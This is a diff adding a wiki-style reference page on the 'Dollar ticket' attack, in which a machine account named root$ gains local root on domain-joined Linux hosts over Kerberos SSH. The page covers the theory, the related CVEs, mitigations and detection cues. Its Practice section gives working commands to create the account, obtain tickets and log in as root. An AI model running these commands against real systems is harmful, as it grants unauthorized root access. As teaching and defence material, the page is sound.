@@ -1,0 +1,143 @@
+---
+title: "Dollar Ticket"
+description: "Abusing the trailing $ of machine accounts to become root on a domain-joined Linux host"
+---
+
+## Theory
+
+The Dollar ticket attack abuses two independent behaviours that meet badly: Active Directory names machine accounts with a trailing `$`, and MIT-style Kerberos acceptors **strip that `$`** when mapping a principal to a local username.
+
+Creating a machine account called `root$` therefore yields a ticket that a domain-joined Linux host maps to the local user `root`.
+
+### Attack principle
+
+| Step | What happens |
+| :--- | :--- |
+| 1 | Attacker creates a machine account named `root$` |
+| 2 | Attacker requests a TGT for the principal `root` |
+| 3 | The KDC finds no user `root`, matches the machine account `root$`, and issues a ticket for it |
+| 4 | An MIT Kerberos service (e.g. SSH) maps `root$@DOMAIN` to local user `root` by stripping the `$` |
+| 5 | Attacker lands as local `root` |
+
+Two things make this work: the default [MachineAccountQuota](/ad/movement/domain-settings/machineaccountquota) of 10, which lets any domain user create machine accounts, and the MIT Kerberos `auth_to_local` rule that strips the trailing `$`.
+
+`root` is the obvious target but any local account works.
+
+### Relationship with sAMAccountName spoofing
+
+[sAMAccountName spoofing](/ad/movement/kerberos/principal-confusion/samaccountname-spoofing) shares the same roots, the trailing `$` convention and abuse of MachineAccountQuota, but aims elsewhere:
+
+| | sAMAccountName spoofing | Dollar ticket |
+| :--- | :--- | :--- |
+| Target | Active Directory escalation | domain-joined Linux hosts |
+| Outcome | impersonate a domain controller | local privilege escalation to root via SSH |
+| Chain | multi-step, timing-sensitive | short and simple |
+
+### Attack vectors
+
+* Linux/UNIX systems joined to AD with SSSD, `realm` or similar
+* Services relying on the default MIT Kerberos principal-to-username mapping
+* Environments not enforcing PAC validation
+* SSH daemons configured with GSSAPI authentication
+
+### Historical context
+
+Disclosed November 2021 across several CVEs:
+
+| CVE | Component | Issue |
+| :--- | :--- | :--- |
+| [CVE-2020-25717](https://www.samba.org/samba/security/CVE-2020-25717.html) | Samba | a domain user could become root on domain members |
+| [CVE-2020-25719](https://www.samba.org/samba/security/CVE-2020-25719.html) | Samba AD DC | did not always rely on the SID and PAC in tickets |
+| [CVE-2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287) | Microsoft | authentication updates addressing privilege escalation |
+| [CVE-2022-26923](/ad/movement/ad-cs/certifried) | Microsoft | Certifried, a related AD escalation |
+
+## Practice
+
+Requires valid domain credentials and a non-zero [MachineAccountQuota](/ad/movement/domain-settings/machineaccountquota). The target must be a Linux/UNIX host joined to the domain, using MIT-style Kerberos without strict PAC validation.
+
+<Tabs items={['Ticket-based', 'Password-based']}>
+<Tab value="Ticket-based">
+
+```bash
+# Obtain an initial Kerberos ticket
+kinit $USER
+
+# Create a machine account named after a privileged local user
+addcomputer.py -k -dc-host "$DC_IP" -computer-name 'root' \
+  -computer-pass 'ComplexPassword123!' "$DOMAIN"/"$USER"
+
+# Request a TGT for the principal 'root'; the KDC matches 'root$'
+kinit root
+
+# Authenticate; MIT Kerberos maps root$ -> root
+ssh -o PreferredAuthentications=gssapi-with-mic -l root "$TARGET"
+```
+
+</Tab>
+
+<Tab value="Password-based">
+
+```bash
+# Create the machine account
+addcomputer.py -dc-ip "$DC_IP" -computer-name 'root' \
+  -computer-pass 'ComplexPassword123!' "$DOMAIN"/"$USER":"$PASSWORD"
+
+# Request a TGT for the machine account
+getTGT.py "$DOMAIN"/'root$':'ComplexPassword123!' -dc-ip "$DC_IP"
+
+export KRB5CCNAME='root$.ccache'
+
+ssh -o PreferredAuthentications=gssapi-with-mic -l root "$TARGET"
+```
+
+</Tab>
+</Tabs>
+
+<Callout type="info">
+
+The machine account password must satisfy the domain password policy, so use something long with mixed case, digits and symbols.
+
+</Callout>
+
+### Cleanup
+
+<Tabs items={['UNIX-like', 'Windows']}>
+<Tab value="UNIX-like">
+
+```bash
+addcomputer.py -delete -dc-ip $DC_IP -computer-name 'root' "$DOMAIN/$USER:$PASSWORD"
+```
+
+</Tab>
+
+<Tab value="Windows">
+
+```powershell
+Remove-ADComputer -Identity "root" -Confirm:$false
+```
+
+</Tab>
+</Tabs>
+
+## Mitigation
+
+| Control | Where |
+| :--- | :--- |
+| Set `ms-DS-MachineAccountQuota` to `0` | `Set-ADDomain` |
+| Restrict `SeMachineAccountPrivilege` | Group Policy |
+| Pre-create privileged local names as disabled AD accounts | Active Directory |
+| Enable PAC validation (SSSD 2.7+) | `/etc/sssd/sssd.conf`, `pac_check = pac_present, upn_dns_info_ex_present` |
+| Disable the `auth_to_local` translation plugin | `/etc/krb5.conf.d/disable-localauth.conf`, `[plugins] localauth = {disable = an2ln}` |
+| Disable root SSH login | `/etc/ssh/sshd_config`, `PermitRootLogin no` |
+
+### Detection
+
+* Machine accounts created by standard users
+* Machine accounts with privileged usernames (`root$`, `admin$`)
+* `KRB_TGS_REQ` requests with no corresponding `KRB_AS_REQ`
+
+## Resources
+
+<ResourceCard href="https://wiki.samba.org/index.php/Security/Dollar_Ticket_Attack" title="Dollar Ticket Attack" description="wiki.samba.org" />
+<ResourceCard href="https://web.mit.edu/kerberos/krb5-latest/doc/admin/host_config.html" title="MIT Kerberos host configuration" description="web.mit.edu" />
+<ResourceCard href="https://bl4ckarch.github.io/posts/GOAD-DRACARYS" title="GOAD DRACARYS" description="bl4ckarch.github.io" />
